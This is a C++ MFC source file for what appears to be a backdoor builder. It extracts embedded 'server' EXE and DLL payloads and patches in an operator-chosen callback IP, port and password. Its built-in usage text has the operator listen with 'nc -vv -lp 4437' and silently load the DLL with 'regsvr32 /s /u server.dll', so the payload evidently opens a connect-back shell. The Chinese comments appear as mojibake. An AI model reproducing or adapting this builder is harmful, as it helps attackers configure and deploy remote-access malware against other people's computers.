
// MFC���ö�Dlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "MFC���ö�.h"
#include "MFC���ö�Dlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// ����Ӧ�ó��򡰹��ڡ��˵���� CAboutDlg �Ի���

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_ABOUTBOX };
#endif

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

// ʵ��
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMFC���ö�Dlg �Ի���



CMFC���ö�Dlg::CMFC���ö�Dlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(IDD_MFC_DIALOG, pParent)
	, m_szIpStr(_T("127.0.0.1"))
	, m_szPortStr(_T("4437"))
	, m_szOtherStr(_T("123456"))
	, m_usage_method(_T("EXEʹ�ã�\r\nNC�����˿ڣ�ֱ������\r\nDLLʹ�ã�\r\nnc -vv -lp 4437\r\nregsvr32 /s /u server.dll"))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CMFC���ö�Dlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT2, m_szIpStr);
	DDX_Text(pDX, IDC_szPort, m_szPortStr);
	DDX_Text(pDX, IDC_szOther, m_szOtherStr);
	DDX_Text(pDX, IDC_EDIT1, m_usage_method);
}

BEGIN_MESSAGE_MAP(CMFC���ö�Dlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CMFC���ö�Dlg::OnBnClickedOk)
	ON_BN_CLICKED(IDC_BUTTON2, &CMFC���ö�Dlg::OnBnChangeResource)
	ON_BN_CLICKED(IDC_BUTTON3, &CMFC���ö�Dlg::OnBuild_DLL)
	ON_BN_CLICKED(IDC_BUTTON4, &CMFC���ö�Dlg::Builx64EXE)
	ON_BN_CLICKED(IDC_BUTTON5, &CMFC���ö�Dlg::Builx64DLL)
END_MESSAGE_MAP()


// CMFC���ö�Dlg ��Ϣ�������

BOOL CMFC���ö�Dlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// ��������...���˵�����ӵ�ϵͳ�˵��С�

	// IDM_ABOUTBOX ������ϵͳ���Χ�ڡ�
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// ���ô˶Ի����ͼ�ꡣ  ��Ӧ�ó��������ڲ��ǶԻ���ʱ����ܽ��Զ�
	//  ִ�д˲���
	SetIcon(m_hIcon, TRUE);			// ���ô�ͼ��
	SetIcon(m_hIcon, FALSE);		// ����Сͼ��

	// TODO: �ڴ���Ӷ���ĳ�ʼ������

	return TRUE;  // ���ǽ��������õ��ؼ������򷵻� TRUE
}

void CMFC���ö�Dlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// �����Ի��������С����ť������Ҫ����Ĵ���
//  �����Ƹ�ͼ�ꡣ  ����ʹ���ĵ�/��ͼģ�͵� MFC Ӧ�ó���
//  �⽫�ɿ���Զ���ɡ�

void CMFC���ö�Dlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // ���ڻ��Ƶ��豸������

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// ʹͼ���ڹ����������о���
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// ����ͼ��
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//���û��϶���С������ʱϵͳ���ô˺���ȡ�ù��
//��ʾ��
HCURSOR CMFC���ö�Dlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}



void CMFC���ö�Dlg::OnBnClickedOk()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	CDialogEx::OnOK();
}


void CMFC���ö�Dlg::OnBnChangePE()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	UpdateData(true);

	BOOL bRet = false;     // ��״̬��־
	TCHAR * pFileData;     // �ļ�������
	DWORD d_FileSize;      // �ļ���С



	// �����ļ����ݲ�д��  
	HANDLE hFile = CreateFile(strResult, GENERIC_READ, 0, NULL, OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL, NULL);

	d_FileSize = GetFileSize(hFile, NULL);
	pFileData = new TCHAR[d_FileSize + 1];

	bRet = ReadFile(hFile, pFileData, d_FileSize, &d_FileSize, NULL);
	if (0 == bRet)
	{
		return;
	}

	// �滻Ŀ���ִ���ļ��е�ָ����Ϣ:IP port �Լ���������Ϣ  
	TCHAR szIpStr[] =    L"AAAAAAAAAAAAAAAAAAAAAAAAAAAA";
	TCHAR szPortStr[] =  L"BBBBBBBBBBBBBBBBBBBBBBBBBBBB";
	TCHAR szOtherStr[] = L"CCCCCCCCCCCCCCCCCCCCCCCCCCCC";

	TCHAR * pDst;
	int i = 0;

	// ����IP�ַ���  
	while (true)
	{
		if (wcscmp(szIpStr, pFileData + i) == 0)
		{
			break;
		}
		else
		{
			i++;
		}
	}

	// �ҵ�IP��ַ�ַ�����Ӧ�ĵ�ַƫ��
	pDst = pFileData + i;

	//CStringתchar ��ԭ�ȵ�AAAAA...�滻����������Ҫ�趨��IP��ַ
	wmemset(pDst, 0, wcslen(szIpStr)+1);                       // ���ԭ��AAAA�ַ���
	wmemcpy(pDst, m_szIpStr, m_szIpStr.GetLength() + 1);       // ���趨��IP�ַ������Ƶ��ڴ���

	// ����˿��ַ���  
	while (true)
	{
		if (wcscmp(szPortStr, pFileData + i) == 0)
		{
			break;
		}
		else
		{
			i++;
		}
	}
	pDst = pFileData + i;
	//CStringתchar ��ԭ�ȵ�BBBBB...�滻����������Ҫ�趨��IP��ַ
	wmemset(pDst, 0, wcslen(szPortStr) + 1);                       // ���ԭ��BBBB�ַ���
	wmemcpy(pDst, m_szPortStr, m_szPortStr.GetLength() + 1);       // ���趨�Ķ˿��ַ������Ƶ��ڴ���

	// ����������Ϣ�ַ���
	while (true)
	{
		if (wcscmp(szOtherStr, pFileData + i) == 0)
		{
			break;
		}
		else
		{
			i++;
		}
	}
	pDst = pFileData + i;
	//CStringתchar ��ԭ�ȵ�BBBBB...�滻����������Ҫ�趨��IP��ַ
	wmemset(pDst, 0, wcslen(szOtherStr) + 1);                      // ���ԭ��CCCCC�ַ���
	wmemcpy(pDst, m_szOtherStr, m_szOtherStr.GetLength() + 1);     // ���趨�Ķ˿��ַ������Ƶ��ڴ���




	// �ͷ��޸ĺ���ļ�
	HANDLE hFile_;

	switch (BuildFlag)
	{
	case 1: 
	{
		// �ͷ��޸ĺ��EXE�ļ�
		hFile_ = CreateFile(strPath + "server.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // ������Ϣ
	}break;
	case 2: {
		// �ͷ��޸ĺ��EXE�ļ�
		hFile_ = CreateFile(strPath + "server.dll", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // ������Ϣ
	
	}break;
	case 3: {
		// �ͷ��޸ĺ��EXE�ļ�
		hFile_ = CreateFile(strPath + "server_x64.exe", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // ������Ϣ
	
	}break;
	case 4: {
	
		// �ͷ��޸ĺ��EXE�ļ�
		hFile_ = CreateFile(strPath + "server_x64.dll", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
			FILE_ATTRIBUTE_NORMAL, NULL);  // ������Ϣ

	}break;

	}

	// д���ļ�	
	bRet = WriteFile(hFile_, pFileData, d_FileSize, &d_FileSize, NULL);
	if (bRet == 0)
	{
		return;
	}

	// �رվ��
	CloseHandle(hFile_);
	delete pFileData;                                              // ɾ������
	CloseHandle(hFile);                                            // �رվ��
	DeleteFile(strResult);                                         // ɾ��ԭʼ�ļ�
}


BOOL CMFC���ö�Dlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: �ڴ����ר�ô����/����û���
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_RETURN)
	{
		if (GetFocus()->GetDlgCtrlID() == IDC_szIP)//���»س��������ǰ���������Լ������Ŀؼ���
		{
			// ���������£�������»س�ʱ����������Ҫ�Ŀؼ���
			OnBnChangePE();
		}
		return TRUE;
	}
	if (pMsg->message == WM_KEYDOWN && pMsg->wParam == VK_ESCAPE)
		return TRUE;
	return CDialogEx::PreTranslateMessage(pMsg);
}


void CMFC���ö�Dlg::OnBnChangeResource()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	HANDLE hFile;            //�ͷ���Դ��ĳ���ļ���
	BOOL bRet = false;     // ��״̬��־

	// �����Դ���
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_EXE1), TEXT("EXE"));

	// �����Դ�ļ���С
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// ������Դ�ļ�
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// ������Դ�����ָ��
	LPVOID pBuffer = LockResource(hGlobal);


	// ���ԭ���Ļ���
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// ���Ҫ�����PE�ļ�·��
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//ɾ���ļ�����ֻ���·�� �ִ�

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// ����������Դ�ͷ��ļ���λ��
	strEXE = "server.tmp";
	strResult = strPath+strEXE;

	// ɾ��ԭ�����ļ�
	DeleteFile(strResult);
	DeleteFile(strPath+"server.exe");


	// �½��ļ�
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// д���ļ�
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// �رվ��
	CloseHandle(hFile);
	// ����EXE��ʶ
	BuildFlag = 1;
	// �޸�PE����
	OnBnChangePE();


}


void CMFC���ö�Dlg::OnBuild_DLL()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������
	HANDLE hFile;            //�ͷ���Դ��ĳ���ļ���
	BOOL bRet = false;       // ��״̬��־
	
	// �����Դ���
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL1), TEXT("DLL"));

	// �����Դ�ļ���С
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// ������Դ�ļ�
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// ������Դ�����ָ��
	LPVOID pBuffer = LockResource(hGlobal);


	// ���ԭ���Ļ���
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// ���Ҫ�����PE�ļ�·��
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//ɾ���ļ�����ֻ���·�� �ִ�

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// ����������Դ�ͷ��ļ���λ��
	strEXE = "server.tmp";
	strResult = strPath + strEXE;

	// ɾ��ԭ�����ļ�
	DeleteFile(strResult);
	DeleteFile(strPath + "server.dll");

	// �½��ļ�
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// д���ļ�
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// �رվ��
	CloseHandle(hFile);
	// ����DLL��ʶ
	BuildFlag = 2;

	// �޸�PE����
	OnBnChangePE();
}


void CMFC���ö�Dlg::Builx64EXE()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	HANDLE hFile;            //�ͷ���Դ��ĳ���ļ���
	BOOL bRet = false;     // ��״̬��־

						   // �����Դ���
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_X64_EXE1), TEXT("x64_EXE"));

	// �����Դ�ļ���С
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// ������Դ�ļ�
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// ������Դ�����ָ��
	LPVOID pBuffer = LockResource(hGlobal);


	// ���ԭ���Ļ���
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// ���Ҫ�����PE�ļ�·��
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//ɾ���ļ�����ֻ���·�� �ִ�

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// ����������Դ�ͷ��ļ���λ��
	strEXE = "server.tmp";
	strResult = strPath + strEXE;

	// ɾ��ԭ�����ļ�
	DeleteFile(strResult);
	DeleteFile(strPath + "server_x64.exe");


	// �½��ļ�
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// д���ļ�
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// �رվ��
	CloseHandle(hFile);
	// ����EXE��ʶ
	BuildFlag = 3;
	// �޸�PE����
	OnBnChangePE();
}


void CMFC���ö�Dlg::Builx64DLL()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	HANDLE hFile;            //�ͷ���Դ��ĳ���ļ���
	BOOL bRet = false;     // ��״̬��־

						   // �����Դ���
	HRSRC hRsrc = FindResource(NULL, MAKEINTRESOURCE(IDR_X64_DLL1), TEXT("x64_DLL"));

	// �����Դ�ļ���С
	DWORD dwSize = SizeofResource(NULL, hRsrc);

	// ������Դ�ļ�
	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);

	// ������Դ�����ָ��
	LPVOID pBuffer = LockResource(hGlobal);


	// ���ԭ���Ļ���
	strEXE = _T("");
	strPath = _T("");
	strResult = _T("");

	// ���Ҫ�����PE�ļ�·��
	TCHAR _szPath[MAX_PATH + 1] = { 0 };
	GetModuleFileName(NULL, _szPath, MAX_PATH);
	(_tcsrchr(_szPath, _T('\\')))[1] = 0;//ɾ���ļ�����ֻ���·�� �ִ�

	for (int n = 0; _szPath[n]; n++)
	{
		if (_szPath[n] != _T('\\'))
		{
			strPath += _szPath[n];
		}
		else
		{
			strPath += _T("\\\\");
		}
	}

	// ����������Դ�ͷ��ļ���λ��
	strEXE = "server.tmp";
	strResult = strPath + strEXE;

	// ɾ��ԭ�����ļ�
	DeleteFile(strResult);
	DeleteFile(strPath + "server_x64.dll");


	// �½��ļ�
	hFile = CreateFile(strResult, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);

	// д���ļ�
	bRet = WriteFile(hFile, pBuffer, dwSize, &dwSize, NULL);
	if (bRet == 0)
	{
		return;
	}
	// �رվ��
	CloseHandle(hFile);
	// ����EXE��ʶ
	BuildFlag = 4;
	// �޸�PE����
	OnBnChangePE();
}
